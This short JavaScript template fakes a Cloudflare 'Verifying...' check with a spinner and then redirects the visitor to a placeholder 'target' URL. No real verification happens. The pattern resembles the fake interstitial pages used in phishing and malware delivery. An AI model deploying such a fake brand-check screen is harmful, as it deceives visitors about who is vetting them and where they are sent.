setTimeout(function() {
    const box = document.querySelector('.verification-box');
    box.innerHTML = '<div class="spinner"></div> Verifying... <span class="cloudflare">CLOUDFLARE</span>';
}, 1000);

setTimeout(function() {
    window.location.href = 'https://your-target-url.com';
}, 5000);
